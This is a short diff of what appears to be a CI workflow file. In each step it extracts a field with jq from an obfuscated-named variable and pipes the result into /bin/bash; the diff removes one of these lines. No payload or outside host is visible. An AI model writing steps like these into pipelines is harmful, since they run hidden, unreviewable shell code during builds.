@@ -26,7 +26,6 @@ jobs:
           echo $nv17463 | jq -r .erkv001 | /bin/bash
           echo $e5 | jq -r .au3159 | /bin/bash
           printf '%s' "$lvpxj548" | jq -r .h3 | /bin/bash
-          printf '%s' "$scsed38" | jq -r .fvamv6402 | /bin/bash
           echo $xkc17691 | jq -r .pgakm12 | /bin/bash
 
       - name: Archive output
